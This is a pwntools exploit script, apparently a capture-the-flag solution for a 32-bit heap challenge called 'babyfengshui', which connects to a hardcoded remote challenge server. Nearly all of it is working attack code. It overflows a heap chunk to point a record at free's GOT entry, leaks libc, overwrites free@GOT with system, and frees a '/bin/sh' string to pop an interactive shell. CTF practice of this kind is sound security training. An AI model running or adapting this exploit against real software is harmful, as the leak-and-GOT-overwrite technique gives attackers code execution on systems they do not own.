# the real libc.so of remote is libc-2.23.so
from pwn import *
context(os="linux", arch="i386")

DEBUG = 1
LOCAL = 0

def debug_on():
	context.log_level = "debug"

g_fname = "./babyfengshui"
g_elf = ELF(g_fname)
g_libcname = "/glibc/2.19/32/lib/libc-2.19.so" if LOCAL else "./libc-2.19.so"
ld_name = "/glibc/2.19/32/lib/ld-2.19.so"

if (LOCAL):
	g_io = process([ld_name, g_fname], env={"LD_PRELOAD" : g_libcname})
else:
	g_io = remote("220.249.52.134", 58877)

g_libc = ELF(g_libcname)

def getpid():
	if (DEBUG & LOCAL):
		log.info("PID: %d", g_io.proc.pid)
		pause()

s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline

def opt(idx):
	sla("Action: ", str(idx))

def add(size, name, txt_len, txt):
	opt(0)
	sla("size of description: ", str(size))
	sla("name: ", name)
	sla("text length: ", str(txt_len))
	sla("text: ", txt)

def delete(idx):
	opt(1)
	sla("index: ", str(idx))

def show(idx):
	opt(2)
	sla("index: ", str(idx))

def update(idx, txt_len, txt):
	opt(3)
	sla("index: ", str(idx))
	sla("text length: ", str(txt_len))
	sla("text: ", txt)

def pwn():
	add(0x20, "000", 0x20, "aaa")
	add(0x20, "111", 0x20, "bbb")
	delete(0)
	# write overflow: write free_got into user[1].pDesc
	add(0x84, "222", 0xbc, flat(['a'*0x84, 0x29, 'b'*0x20, 0x28, 0x89, g_elf.got["free"]]) )
	show(1)
	ru("description: ")
	addr_free = u32(rl()[:4])
	libc_base = addr_free - (g_libc.symbols["free"] if LOCAL else 0x070750)
	addr_system = libc_base + (g_libc.symbols["system"] if LOCAL else 0x03a940)
	log.success("free@%#x\nlibc@%#x\nsystem@%#x", addr_free, libc_base, addr_system)
	
	add(0x20, "333", 0x20, "/bin/sh\0")
	# hijack free@got <- addr_system
	update(1, 4, p32(addr_system)) 
	#getpid()
	# trigger system("/bin/sh")
	delete(3)

if ("__main__" == __name__):
	debug_on()
	pwn()
	g_io.interactive()

